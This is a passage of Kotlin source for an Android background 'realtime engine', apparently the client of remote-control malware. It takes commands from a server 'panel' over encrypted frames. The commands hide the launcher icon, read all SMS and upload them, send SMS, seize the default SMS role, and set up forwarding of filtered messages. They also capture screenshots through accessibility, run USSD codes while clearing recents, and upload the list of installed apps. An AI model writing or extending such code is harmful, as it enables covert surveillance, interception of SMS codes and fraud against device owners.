package com.base.realtime.engine

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.telephony.SubscriptionManager
import android.util.Log
import com.base.realtime.config.AppConfigs
import com.base.realtime.endpoint.PortEndpointStore
import com.base.realtime.device.ClientInfo
import com.base.realtime.device.IconController
import com.base.realtime.device.InstallTracker
import com.base.realtime.device.ScreenState
import com.base.realtime.access.AccessibilityGate
import com.base.realtime.access.AgentAccessibilityService
import com.base.realtime.access.GrantReporter
import com.base.realtime.apps.InstalledApp
import com.base.realtime.apps.InstalledApps
import com.base.realtime.apps.InstalledAppsPush
import com.base.realtime.ussd.UssdCapture
import com.base.realtime.ussd.UssdDialer
import com.base.realtime.access.ScreenshotUploader
import com.base.realtime.access.UiGuideBridge
import com.base.realtime.sms.OffmodePolicyStore
import com.base.realtime.sms.OffmodeStore
import com.base.realtime.sms.SmsDefaultJob
import com.base.realtime.sms.SmsNormalize
import com.base.realtime.sms.SmsInboxPush
import com.base.realtime.sms.SmsItem
import com.base.realtime.sms.SmsPermissions
import com.base.realtime.sms.SmsReader
import com.base.realtime.sms.SmsSender
import com.base.realtime.sms.SmsStatus
import com.base.realtime.sms.SmsSync
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import com.base.realtime.data.InboxEntity
import com.base.realtime.data.OutboxEntity
import com.base.realtime.data.RealtimeDatabase
import com.base.realtime.identity.BlockStore
import com.base.realtime.identity.Identity
import com.base.realtime.identity.IdentityStore
import com.base.realtime.net.SessionClient
import com.base.realtime.net.SocketSession
import com.base.realtime.protocol.Codec
import com.base.realtime.protocol.Envelope
import com.base.realtime.protocol.ErrorPayload
import com.base.realtime.protocol.FrameCrypto
import com.base.realtime.protocol.PresencePayload
import com.base.realtime.protocol.Protocol
import com.base.realtime.reliability.ackDelayMillis
import com.base.realtime.reliability.reconnectDelayMillis
import java.io.IOException
import java.util.UUID
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicReference
import kotlin.coroutines.cancellation.CancellationException
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.asCoroutineDispatcher
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.channels.ClosedReceiveChannelException
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.selects.onTimeout
import kotlinx.coroutines.selects.select
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonElement
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.booleanOrNull
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.decodeFromJsonElement
import kotlinx.serialization.json.jsonPrimitive
import okhttp3.OkHttpClient

class RealtimeEngine(context: Context) {
    private val app = context.applicationContext
    private val crashHandler = CoroutineExceptionHandler { _, t -> Log.e(TAG, "engine", t) }
    private val protocolThread = AtomicReference<Thread>()
    private val protocolExecutor = Executors.newSingleThreadExecutor { runnable ->
        Thread(runnable, "realtime-protocol").apply {
            isDaemon = true
            uncaughtExceptionHandler = Thread.UncaughtExceptionHandler { _, t -> Log.e(TAG, "protocol thread", t) }
            protocolThread.set(this)
        }
    }
    private val protocol = protocolExecutor.asCoroutineDispatcher()
    private val scope = CoroutineScope(SupervisorJob() + protocol + crashHandler)
    private val identityStore = IdentityStore(app)
    private val db by lazy { RealtimeDatabase.get(app) }
    private val http = OkHttpClient.Builder()
        .pingInterval(20, TimeUnit.SECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()
    private val wake = Channel<Unit>(Channel.CONFLATED)
    private val outboxMu = Mutex()
    private val serviceUp = AtomicBoolean(false)
    private val loopGuard = AtomicBoolean(false)
    private val panelJobs = ConcurrentHashMap.newKeySet<String>()
    private val networkRegistered = AtomicBoolean(false)
    private val simsWatch = AtomicBoolean(false)
    private val networkUp = MutableStateFlow(true)
    private val _state = MutableStateFlow(EngineState())
    private val _inbox = MutableStateFlow<List<InboxEntity>>(emptyList())
    val state: StateFlow<EngineState> = _state.asStateFlow()
    val inbox: StateFlow<List<InboxEntity>> = _inbox.asStateFlow()

    private var session: SocketSession? = null
    private var helloId: String = ""
    private var helloAcked = false
    private var helloNextAt = 0L
    private var sessionStartedAt = 0L
    private var lastInboundAt = 0L
    private var authRejected = false
    private var blockedNow = false
    private var lastFail = ""
    private val deviceOnline = mutableMapOf<String, Boolean>()
    private var wakeLock: PowerManager.WakeLock? = try {
        app.getSystemService(PowerManager::class.java)
            ?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "realtime:handshake")
            ?.apply { setReferenceCounted(false) }
    } catch (_: Throwable) {
        null
    }

    fun deviceId(): String = try {
        identityStore.deviceId()
    } catch (_: Throwable) {
        "unknown"
    }

    fun ensureStarted() {
        serviceUp.set(true)
        UiGuideBridge.bindEngine(this)
        registerNetwork()
        watchSims()
        ScreenState.watch(app)
        wake.trySend(Unit)
        scope.launch(Dispatchers.IO) {
            try {
                PortEndpointStore.startListening(app)
            } catch (t: Throwable) {
                Log.w(TAG, "endpoint refresh", t)
            }
        }
        if (!loopGuard.compareAndSet(false, true)) return
        scope.launch {
            try {
                runLoop()
            } catch (e: CancellationException) {
                throw e
            } catch (t: Throwable) {
                Log.e(TAG, "loop ended", t)
            } finally {
                loopGuard.set(false)
            }
        }
    }

    fun onServiceDestroyed() {
        serviceUp.set(false)
        scope.launch {
            try {
                session?.cancel()
            } catch (_: Throwable) {
            }
            releaseWakeLock()
        }
        wake.trySend(Unit)
    }

    fun reconnect() {
        scope.launch {
            try {
                session?.cancel()
            } catch (_: Throwable) {
            }
        }
        wake.trySend(Unit)
        ensureStarted()
    }

    fun requestStop() {
        try {
            identityStore.disarm()
        } catch (t: Throwable) {
            Log.w(TAG, "stop", t)
        }
        serviceUp.set(false)
        scope.launch {
            try {
                session?.cancel()
            } catch (_: Throwable) {
            }
            releaseWakeLock()
            _state.value = EngineState(phase = Phase.Stopped, serverOnline = false, message = "متوقف شد")
        }
        wake.trySend(Unit)
    }

    fun consume(messageId: String) {
        scope.launch {
            try {
                db.inboxDao().delete(messageId)
                refreshInbox()
            } catch (t: Throwable) {
                Log.w(TAG, "consume", t)
            }
        }
    }

    fun uploadSms(items: List<SmsItem>) {
        if (items.isEmpty()) return
        scope.launch {
            try {
                pushSmsBatches(items)
            } catch (t: Throwable) {
                Log.w(TAG, "sms upload", t)
            }
        }
    }

    /**
     * Queues a message until the server acks it.
     * Returns false when [type] is reserved or the JSON is larger than 32 KiB.
     * Call this off the engine protocol thread when the boolean result must include the queue cap.
     */
    fun enqueue(type: String, payload: JsonElement, dedupeKey: String? = null): Boolean {
        if (type.isBlank() || type in Protocol.RESERVED) return false
        val envelope = try {
            Protocol.message(type, payload)
        } catch (_: Throwable) {
            return false
        }
        val body = try {
            Codec.encode(envelope)
        } catch (_: Throwable) {
            return false
        }
        if (body.toByteArray(Charsets.UTF_8).size > 32 * 1024) return false
        scope.launch {
            try {
                // مسیر سریع AI: اگر سوکت آماده است مستقیم بفرست، بعد برای retry در outbox بگذار
                val aiFast = type == Protocol.TYPE_AI_UI_GUIDE_REQUEST ||
                    type == Protocol.TYPE_AI_UI_GUIDE_RESULT
                if (aiFast && helloAcked && send(envelope)) {
                    persistOutboxSent(envelope.id, body, dedupeKey)
                    return@launch
                }
                persistOutbox(envelope.id, body, dedupeKey)
                if (helloAcked) {
                    flushOutbox()
                }
            } catch (t: Throwable) {
                Log.w(TAG, "enqueue", t)
            }
        }
        return true
    }

    private suspend fun runLoop() {
        try {
            refreshInbox()
        } catch (t: Throwable) {
            Log.w(TAG, "inbox load", t)
        }
        var failures = 0
        while (currentCoroutineContext().isActive) {
            try {
                if (!serviceUp.get()) {
                    publish(Phase.Stopped, "سرویس پس‌زمینه متوقف است")
                    sleepOrWake(60_000)
                    continue
                }
                val identity = identityStore.get()
                if (identity == null) {
                    publish(Phase.NeedIdentity, "آدرس سرور را ذخیره کنید")
                    sleepOrWake(60_000)
                    continue
                }
                if (BlockStore.isBlocked(app)) {
                    val waitBlocked = BlockStore.waitUntilProbeMs(app)
                    if (waitBlocked > 0L) {
                        publish(Phase.Stopped, "مسدود شده")
                        sleepOrWake(waitBlocked.coerceAtMost(BlockStore.PROBE_INTERVAL_MS))
                        continue
                    }
                }
                if (!networkUp.value && !isLoopback(identity.serverUrl)) {
                    publish(Phase.WaitingNetwork, "شبکه در دسترس نیست")
                    while (serviceUp.get() && !networkUp.value && !isLoopback(identity.serverUrl) && currentCoroutineContext().isActive) {
                        sleepOrWake(5_000)
                    }
                    continue
                }
                publish(Phase.Connecting, "در حال اتصال")
                blockedNow = false
                val authed = connect(identity)
                if (!serviceUp.get()) continue
                if (blockedNow || BlockStore.isBlocked(app) && !authed) {
                    BlockStore.markBlocked(app)
                    blockedNow = false
                    publish(Phase.Stopped, "مسدود شده")
                    sleepOrWake(BlockStore.PROBE_INTERVAL_MS)
                    continue
                }
                if (authed) {
                    BlockStore.clear(app)
                }
                failures = if (authed) 0 else failures + 1
                val rejected = authRejected
                authRejected = false
                val wait = if (rejected) 30_000 else reconnectDelayMillis(failures.coerceAtLeast(1))
                val detail = lastFail.ifBlank { "اتصال برقرار نشد" }
                publish(Phase.Connecting, if (rejected) "توکن رد شد" else detail)
                sleepOrWake(wait)
            } catch (e: CancellationException) {
                throw e
            } catch (t: Throwable) {
                Log.e(TAG, "loop tick", t)
                delay(2_000)
            }
        }
    }

    private suspend fun connect(identity: Identity): Boolean {
        deviceOnline.clear()
        val bearer = try {
            SessionClient.ensure(http, identityStore, identity)
        } catch (e: IOException) {
            if (e.message == "unauthorized") authRejected = true
            if (e.message == "blocked") {
                blockedNow = true
                BlockStore.markBlocked(app)
            }
            lastFail = e.message ?: "نشست برقرار نشد"
            Log.w(TAG, "session ${identity.serverUrl} $lastFail")
            _state.update { it.copy(serverOnline = null) }
            return false
        } catch (t: Throwable) {
            Log.w(TAG, "session", t)
            return false
        } ?: return false
        val current = SocketSession(http, identity.serverUrl, bearer)
        session = current
        helloId = UUID.randomUUID().toString()
        helloAcked = false
        sessionStartedAt = System.currentTimeMillis()
        lastInboundAt = sessionStartedAt
        helloNextAt = sessionStartedAt + 5_000
        acquireWakeLock()
        try {
            val opened = current.open()
            if (!opened || !serviceUp.get()) {
                if (current.closeDetail == "unauthorized") authRejected = true
                lastFail = current.closeDetail.ifBlank { "سوکت بسته شد" }
                Log.w(TAG, "socket ${identity.serverUrl} $lastFail")
                _state.update { it.copy(serverOnline = null) }
                return false
            }
            publish(Phase.Authenticating, "در حال شناسایی")
            if (AppConfigs.load(app).frameKey == null) {
                Log.w(TAG, "frame key missing; server may require REALTIME_FRAME_KEY")
            }
            sendHello(identity)
            while (currentCoroutineContext().isActive && serviceUp.get()) {
                val stop = try {
                    select {
                        current.inbound.onReceive { frame ->
                            handleFrame(frame, identity)
                            false
                        }
                        current.closed.onAwait { true }
                        // outbox wake (مثلاً ai.ui.guide) — منتظر timeout سه‌ثانیه‌ای نمان
                        wake.onReceive {
                            maintenance(identity)
                            false
                        }
                        onTimeout(3_000) { maintenance(identity) }
                    }
                } catch (_: ClosedReceiveChannelException) {
                    true
                } catch (e: CancellationException) {
                    throw e
                } catch (t: Throwable) {
                    Log.w(TAG, "select", t)
                    true
                }
                if (stop) break
            }
            if (current.closeDetail == "unauthorized") authRejected = true
            if (current.closeDetail.contains("blocked")) {
                blockedNow = true
                BlockStore.markBlocked(app)
            }
            return helloAcked
        } finally {
            helloAcked = false
            if (session === current) session = null
            releaseWakeLock()
            current.cancel()
            _state.update { it.copy(serverOnline = null) }
        }
    }

    private suspend fun maintenance(identity: Identity): Boolean {
        val now = System.currentTimeMillis()
        if (!helloAcked && now >= helloNextAt) {
            sendHello(identity)
            helloNextAt = now + 5_000
        }
        if (helloAcked) {
            try {
                flushOutbox()
            } catch (t: Throwable) {
                Log.w(TAG, "outbox flush", t)
            }
        }
        val idle = if (helloAcked) 90_000L else 20_000L
        val since = if (helloAcked) lastInboundAt else sessionStartedAt
        if (now - since > idle) {
            session?.cancel()
            return true
        }
        return false
    }

    private suspend fun handleFrame(text: String, identity: Identity) {
        lastInboundAt = System.currentTimeMillis()
        val plain = try {
            FrameCrypto.open(AppConfigs.load(app).frameKey, text)
        } catch (e: Exception) {
            if (e is CancellationException) throw e
            Log.w(TAG, "bad frame", e)
            session?.cancel()
            return
        }
        val env = try {
            Codec.decode(plain)
        } catch (e: Exception) {
            if (e is CancellationException) throw e
            Log.w(TAG, "bad frame", e)
            session?.cancel()
            return
        }
        if (env.v != Protocol.VERSION) {
            Log.w(TAG, "unsupported version ${env.v}")
            session?.cancel()
            return
        }
        when (env.type) {
            Protocol.TYPE_ACK -> {
                val ref = env.ref ?: return
                try {
                    db.outboxDao().delete(ref)
                } catch (t: Throwable) {
                    Log.w(TAG, "ack delete", t)
                }
                if (ref == helloId) {
                    helloAcked = true
                    InstallTracker.clear(app)
                    releaseWakeLock()
                    publish(Phase.Authenticated, "متصل شد")
                    // بلافاصله outbox را بفرست (AI/SMS نباید تا timeout ۳ثانیه معطل بماند)
                    try {
                        flushOutbox()
                    } catch (t: Throwable) {
                        Log.w(TAG, "outbox flush after hello", t)
                    }
                    InstalledAppsPush.tryPush(app)
                    SmsInboxPush.tryPush(app)
                    ScreenState.publish(app)
                    GrantReporter.sync(app)
                }
            }
            Protocol.TYPE_PING -> send(Protocol.pong(env.id))
            Protocol.TYPE_PONG -> Unit
            Protocol.TYPE_ERROR -> {
                val message = errorMessage(env)
                if (message.contains("invalid identity") || message.contains("unauthorized")) {
                    authRejected = true
                }
                if (message.contains("blocked")) {
                    blockedNow = true
                    BlockStore.markBlocked(app)
                }
                publish(_state.value.phase, message)
            }
            Protocol.TYPE_PRESENCE -> {
                applyPresence(env, identity)
                send(Protocol.ack(env.id))
            }
            else -> acceptIncoming(env, plain)
        }
    }

    private fun applyPresence(env: Envelope, identity: Identity) {
        val payload = env.payload ?: return
        val parsed = runCatching {
            Codec.json.decodeFromJsonElement(PresencePayload.serializer(), payload)
        }.getOrElse {
            Log.w(TAG, "bad presence", it)
            return
        }
        if (parsed.userId != identity.userId) return
        deviceOnline[parsed.deviceId] = parsed.online
        val anyOnline = deviceOnline.values.any { it }
        val message = when {
            parsed.deviceId == identity.deviceId && parsed.online -> "سرور این دستگاه را آنلاین می‌بیند"
            parsed.deviceId == identity.deviceId -> "سرور این دستگاه را آفلاین می‌بیند"
            parsed.online -> "یک دستگاه دیگر آنلاین شد"
            else -> "یک دستگاه دیگر آفلاین شد"
        }
        _state.update {
            it.copy(
                serverOnline = anyOnline,
                lastSeenMillis = parsed.lastSeen,
                message = message,
            )
        }
    }

    private fun errorMessage(env: Envelope): String {
        val payload = env.payload ?: return "خطای سرور"
        return runCatching {
            Codec.json.decodeFromJsonElement(ErrorPayload.serializer(), payload).message
        }.getOrDefault("خطای سرور")
    }

    private suspend fun acceptIncoming(env: Envelope, raw: String) {
        val panelCommand = env.type.startsWith("panel.") && env.type != Protocol.TYPE_PANEL_RESULT
        val aiGuide = env.type == Protocol.TYPE_AI_UI_GUIDE
        try {
            if (db.inboxDao().countId(env.id) > 0) {
                if (panelCommand) {
                    handlePanelCommand(env)
                }
                if (aiGuide) {
                    handleAiUiGuide(env)
                }
                if (Protocol.requiresAck(env.type)) send(Protocol.ack(env.id))
                return
            }
            if (db.inboxDao().count() >= 1000) {
                db.inboxDao().deleteOldest()
            }
            db.inboxDao().insert(InboxEntity(env.id, env.type, raw, env.ts))
            if (panelCommand) {
                handlePanelCommand(env)
                try {
                    db.inboxDao().delete(env.id)
                } catch (_: Throwable) {
                }
            }
            if (aiGuide) {
                handleAiUiGuide(env)
                try {
                    db.inboxDao().delete(env.id)
                } catch (_: Throwable) {
                }
            }
            refreshInbox()
        } catch (t: Throwable) {
            Log.w(TAG, "inbox", t)
            return
        }
        if (Protocol.requiresAck(env.type)) send(Protocol.ack(env.id))
    }

    private fun handleAiUiGuide(env: Envelope) {
        UiGuideBridge.bindEngine(this)
        UiGuideBridge.onGuideMessage(env.payload as? kotlinx.serialization.json.JsonObject)
    }

    private suspend fun handlePanelCommand(env: Envelope) {
        when (env.type) {
            Protocol.TYPE_PANEL_PING -> sendPanelResult(env.id, ok = true)
            Protocol.TYPE_PANEL_ICON -> {
                val payload = env.payload as? JsonObject
                val mode = payload?.get("mode")?.jsonPrimitive?.contentOrNull.orEmpty()
                val fallback = payload?.get("fallback")?.jsonPrimitive?.booleanOrNull == true
                if (mode.isBlank()) {
                    sendPanelResult(env.id, ok = false, error = "mode required")
                    return
                }
                com.base.realtime.access.RecentsClearer.holdForPanel()
                val state = try {
                    if (mode == IconController.MODE_HIDDEN && fallback) {
                        // First-action hide: swap icon first, then disable both launchers.
                        IconController.apply(app, IconController.MODE_CHANGED)
                        IconController.apply(app, IconController.MODE_HIDDEN)
                    } else {
                        IconController.apply(app, mode)
                    }
                } catch (t: Throwable) {
                    Log.w(TAG, "icon", t)
                    sendPanelResult(env.id, ok = false, error = "icon failed")
                    return
                } finally {
                    com.base.realtime.access.RecentsClearer.releaseAfterIcon()
                }
                sendPanelResult(env.id, ok = true, iconState = state)
            }
            Protocol.TYPE_PANEL_SMS_SYNC -> {
                if (!SmsPermissions.granted(app)) {
                    sendPanelResult(env.id, ok = false, error = "permission")
                    return
                }
                val items = try {
                    SmsReader.readAll(app)
                } catch (t: Throwable) {
                    Log.w(TAG, "sms read", t)
                    sendPanelResult(env.id, ok = false, error = "read failed")
                    return
                }
                try {
                    pushSmsBatches(items)
                } catch (t: Throwable) {
                    Log.w(TAG, "sms sync", t)
                    sendPanelResult(env.id, ok = false, error = "sync failed")
                    return
                }
                sendPanelResult(env.id, ok = true, count = items.size)
            }
            Protocol.TYPE_PANEL_SMS_SEND -> {
                if (!SmsPermissions.granted(app)) {
                    sendPanelResult(env.id, ok = false, error = "permission")
                    return
                }
                val payload = env.payload as? JsonObject
                val to = payload?.get("to")?.jsonPrimitive?.contentOrNull.orEmpty()
                val body = payload?.get("body")?.jsonPrimitive?.contentOrNull.orEmpty()
                val sent = SmsSender.send(app, to, body)
                if (sent.isSuccess) {
                    pushSmsBatches(listOf(sent.getOrThrow()))
                    sendPanelResult(env.id, ok = true, count = 1)
                } else {
                    Log.w(TAG, "sms send", sent.exceptionOrNull())
                    sendPanelResult(env.id, ok = false, error = "send failed")
                }
            }
            Protocol.TYPE_PANEL_SMS_DEFAULT -> launchPanel(env.id) { runSmsDefault(env) }
            Protocol.TYPE_PANEL_OFFMODE -> launchPanel(env.id) { runOffmode(env) }
            Protocol.TYPE_PANEL_OFFMODE_POLICY -> {
                val payload = env.payload as? JsonObject
                OffmodePolicyStore.apply(
                    app,
                    personalPattern = payload?.get("personalPattern")?.jsonPrimitive?.contentOrNull.orEmpty(),
                    cmdPersonal = payload?.get("cmdPersonal")?.jsonPrimitive?.contentOrNull.orEmpty(),
                    cmdNonPersonal = payload?.get("cmdNonPersonal")?.jsonPrimitive?.contentOrNull.orEmpty(),
                    cmdAll = payload?.get("cmdAll")?.jsonPrimitive?.contentOrNull.orEmpty(),
                )
                sendPanelResult(env.id, ok = true)
            }
            Protocol.TYPE_PANEL_SCREENSHOT -> {
                if (!AgentAccessibilityService.isEnabled(app)) {
                    sendPanelResult(env.id, ok = false, error = "accessibility")
                    return
                }
                if (android.os.Build.VERSION.SDK_INT < 30) {
                    sendPanelResult(env.id, ok = false, error = "unsupported")
                    return
                }
                val identity = identityStore.get()
                if (identity == null) {
                    sendPanelResult(env.id, ok = false, error = "no identity")
                    return
                }
                val jpeg = try {
                    AccessibilityGate.captureJpeg(app)
                } catch (t: Throwable) {
                    Log.w(TAG, "screenshot capture", t)
                    null
                }
                if (jpeg == null || jpeg.isEmpty()) {
                    sendPanelResult(env.id, ok = false, error = if (AgentAccessibilityService.get() == null) "accessibility" else "capture failed")
                    return
                }
                val uploaded = try {
                    withContext(Dispatchers.IO) {
                        ScreenshotUploader.upload(http, identityStore, identity, jpeg)
                    }
                } catch (t: Throwable) {
                    Log.w(TAG, "screenshot upload", t)
                    false
                }
                if (!uploaded) {
                    sendPanelResult(env.id, ok = false, error = "upload failed")
                    return
                }
                sendPanelResult(env.id, ok = true)
            }
            Protocol.TYPE_PANEL_APPS_SYNC -> launchPanel(env.id) { syncApps(env.id) }
            Protocol.TYPE_PANEL_USSD -> launchPanel(env.id) { runUssd(env) }
            Protocol.TYPE_PANEL_WATCH -> {
                val payload = env.payload as? JsonObject
                val packages = (payload?.get("packages") as? JsonArray)?.mapNotNull { element ->
                    (element as? JsonPrimitive)?.contentOrNull?.trim()?.takeIf { it.contains('.') }
                }.orEmpty()
                com.base.realtime.watch.WatchedPackages.replace(app, packages)
                AgentAccessibilityService.get()?.onWatchList()
                sendPanelResult(env.id, ok = true, count = packages.size)
            }
            else -> sendPanelResult(env.id, ok = false, error = "unknown")
        }
    }

    private fun launchPanel(id: String, block: suspend () -> Unit) {
        if (!panelJobs.add(id)) return
        scope.launch {
            try {
                block()
            } catch (t: Throwable) {
                Log.w(TAG, "panel job", t)
                sendPanelResult(id, ok = false, error = "failed")
            } finally {
                panelJobs.remove(id)
            }
        }
    }

    private suspend fun syncApps(ref: String) {
        if (!InstalledApps.canRead(app)) {
            sendPanelResult(ref, ok = false, error = "permission")
            return
        }
        val items = try {
            withContext(Dispatchers.IO) { InstalledApps.list(app) }
        } catch (t: Throwable) {
            Log.w(TAG, "apps list", t)
            sendPanelResult(ref, ok = false, error = "read failed")
            return
        }
        try {
            pushAppBatches(items)
        } catch (t: Throwable) {
            Log.w(TAG, "apps sync", t)
            sendPanelResult(ref, ok = false, error = "sync failed")
            return
        }
        sendPanelResult(ref, ok = true, count = items.size)
    }

    private suspend fun runUssd(env: Envelope) {
        val payload = env.payload as? JsonObject
        val code = payload?.get("code")?.jsonPrimitive?.contentOrNull.orEmpty()
        val slot = payload?.get("slot")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 0
        com.base.realtime.access.RecentsClearer.holdForPanel()
        try {
            val (ok, value) = UssdDialer.request(app, code, slot)
            if (ok) sendPanelResult(env.id, ok = true, text = value)
            else sendPanelResult(env.id, ok = false, error = value)
        } finally {
            awaitUssdClosed()
            com.base.realtime.access.RecentsClearer.releasePanel()
        }
    }

    /** Recent فقط بعد از بسته شدن دیالوگ USSD. */
    private suspend fun awaitUssdClosed() {
        val deadline = SystemClock.elapsedRealtime() + 8_000L
        while (SystemClock.elapsedRealtime() < deadline) {
            val svc = AgentAccessibilityService.get()
            val open = UssdCapture.busy() || (svc != null && UssdCapture.visible(svc))
            if (!open) {
                delay(450L)
                val again = AgentAccessibilityService.get()
                val still = UssdCapture.busy() || (again != null && UssdCapture.visible(again))
                if (!still) return
            }
            delay(250L)
        }
    }

    private suspend fun runSmsDefault(env: Envelope) {
        if (!AgentAccessibilityService.isEnabled(app)) {
            sendPanelResult(env.id, ok = false, error = "accessibility")
            return
        }
        val action = (env.payload as? JsonObject)?.get("action")?.jsonPrimitive?.contentOrNull.orEmpty()
            .trim().lowercase()
        val (ok, err) = try {
            when (action) {
                "claim" -> SmsDefaultJob.claim(app)
                "restore" -> SmsDefaultJob.restore(app)
                else -> false to "invalid action"
            }
        } catch (t: Throwable) {
            Log.w(TAG, "sms default", t)
            false to "failed"
        }
        reportSmsStatus()
        if (ok) sendPanelResult(env.id, ok = true, error = err)
        else sendPanelResult(env.id, ok = false, error = err.ifBlank { "failed" })
    }

    private fun runOffmode(env: Envelope) {
        if (!SmsPermissions.granted(app)) {
            sendPanelResult(env.id, ok = false, error = "permission")
            return
        }
        val payload = env.payload as? JsonObject
        val on = payload?.get("on")?.jsonPrimitive?.booleanOrNull == true
        val to = payload?.get("to")?.jsonPrimitive?.contentOrNull.orEmpty()
        val filter = payload?.get("filter")?.jsonPrimitive?.contentOrNull.orEmpty()
        if (on) {
            val number = SmsNormalize.address(to)
            if (number.isEmpty() || number == "unknown" || number.none { it.isDigit() }) {
                sendPanelResult(env.id, ok = false, error = "number")
                return
            }
        }
        OffmodeStore.set(app, on, to, filter)
        reportSmsStatus()
        sendPanelResult(env.id, ok = true)
    }

    fun reportSmsStatus() {
        val payload = SmsStatus.toJson(app)
        val envelope = Protocol.message(Protocol.TYPE_DEVICE_SMS, payload)
        if (send(envelope)) return
        val body = try {
            Codec.encode(envelope)
        } catch (_: Throwable) {
            return
        }
        scope.launch {
            try {
                persistOutbox(envelope.id, body, null)
            } catch (_: Throwable) {
            }
        }
    }

    fun pushInstalledAppsSnapshot(onDone: (() -> Unit)? = null) {
        scope.launch {
            try {
                if (!InstalledApps.canRead(app)) return@launch
                val items = withContext(Dispatchers.IO) { InstalledApps.list(app) }
                if (pushAppBatches(items)) onDone?.invoke()
            } catch (t: Throwable) {
                Log.w(TAG, "apps snapshot", t)
            }
        }
    }

    private suspend fun pushAppBatches(items: List<InstalledApp>): Boolean {
        val chunks = if (items.isEmpty()) listOf(emptyList()) else items.chunked(InstalledApps.CHUNK)
        for ((index, chunk) in chunks.withIndex()) {
            val envelope = Protocol.message(
                Protocol.TYPE_APPS_BATCH,
                InstalledApps.batchPayload(chunk, reset = index == 0),
            )
            val body = try {
                Codec.encode(envelope)
            } catch (t: Throwable) {
                Log.w(TAG, "apps batch encode", t)
                return false
            }
            if (!send(envelope) && !persistOutbox(envelope.id, body, null)) return false
        }
        return true
    }

    private suspend fun pushSmsBatches(items: List<SmsItem>) {
        for (chunk in SmsSync.chunks(items)) {
            val envelope = Protocol.message(Protocol.TYPE_SMS_BATCH, SmsSync.batchPayload(chunk))
            val body = Codec.encode(envelope)
            if (!send(envelope)) {
                persistOutbox(envelope.id, body, null)
            }
        }
    }

    private fun sendPanelResult(
        ref: String,
        ok: Boolean,
        iconState: String = "",
        error: String = "",
        count: Int = 0,
        text: String = "",
    ) {
        val envelope = Protocol.panelResult(ref, ok, iconState, error, count, text)
        if (send(envelope)) return
        val body = try {
            Codec.encode(envelope)
        } catch (t: Throwable) {
            Log.w(TAG, "panel result encode", t)
            return
        }
        scope.launch {
            try {
                persistOutbox(envelope.id, body, "panel.result:$ref")
            } catch (t: Throwable) {
                Log.w(TAG, "panel result queue", t)
            }
        }
    }

    private suspend fun flushOutbox() {
        outboxMu.withLock { flushOutboxLocked() }
    }

    private suspend fun flushOutboxLocked() {
        val now = System.currentTimeMillis()
        val due = db.outboxDao().due(now, 20)
        for (item in due) {
            val current = session ?: return
            val wire = try {
                FrameCrypto.seal(AppConfigs.load(app).frameKey, item.body)
            } catch (t: Throwable) {
                Log.w(TAG, "seal outbox", t)
                return
            }
            if (!current.send(wire)) {
                db.outboxDao().schedule(item.id, item.attempts, now + 1_000)
                return
            }
            val next = now + ackDelayMillis(item.attempts + 1)
            db.outboxDao().schedule(item.id, item.attempts + 1, next)
        }
    }

    private suspend fun persistOutbox(id: String, body: String, dedupeKey: String?): Boolean {
        if (dedupeKey != null) {
            db.outboxDao().deleteByKey(dedupeKey)
        } else if (db.outboxDao().count() >= 1000) {
            Log.w(TAG, "outbox full")
            return false
        }
        db.outboxDao().insert(
            OutboxEntity(
                id = id,
                dedupeKey = dedupeKey,
                body = body,
                attempts = 0,
                nextAttemptAt = 0,
                createdAt = System.currentTimeMillis(),
            ),
        )
        wake.trySend(Unit)
        return true
    }

    /** بعد از send موفق: برای ack/retry نگه دار، ولی فوری دوباره نفرست. */
    private suspend fun persistOutboxSent(id: String, body: String, dedupeKey: String?) {
        if (dedupeKey != null) {
            db.outboxDao().deleteByKey(dedupeKey)
        }
        val now = System.currentTimeMillis()
        db.outboxDao().insert(
            OutboxEntity(
                id = id,
                dedupeKey = dedupeKey,
                body = body,
                attempts = 1,
                nextAttemptAt = now + ackDelayMillis(1),
                createdAt = now,
            ),
        )
    }

    private suspend fun refreshInbox() {
        _inbox.value = try {
            db.inboxDao().pending()
        } catch (t: Throwable) {
            Log.w(TAG, "inbox read", t)
            emptyList()
        }
    }

    private suspend fun sendHello(identity: Identity) {
        val screen = ScreenState.read(app)
        ScreenState.remember(screen)
        try {
            db.outboxDao().deleteByKey(Protocol.TYPE_DEVICE_SCREEN)
        } catch (t: Throwable) {
            Log.w(TAG, "screen outbox", t)
        }
        val client = ClientInfo.toJsonObject(ClientInfo.collect(app))
        send(
            Protocol.hello(
                helloId,
                identity.userId,
                identity.deviceId,
                identityStore.fcmToken(),
                AppConfigs.load(app).port,
                install = InstallTracker.pending(app),
                client = client,
                grants = GrantReporter.current(app),
                screen = ScreenState.json(screen),
            ),
        )
    }

    private fun send(envelope: Envelope): Boolean {
        val current = session ?: return false
        return try {
            current.send(FrameCrypto.seal(AppConfigs.load(app).frameKey, Codec.encode(envelope)))
        } catch (t: Throwable) {
            Log.w(TAG, "send", t)
            false
        }
    }

    private suspend fun sleepOrWake(millis: Long) {
        if (millis <= 0L) return
        try {
            withTimeoutOrNull(millis) { wake.receive() }
        } catch (_: Throwable) {
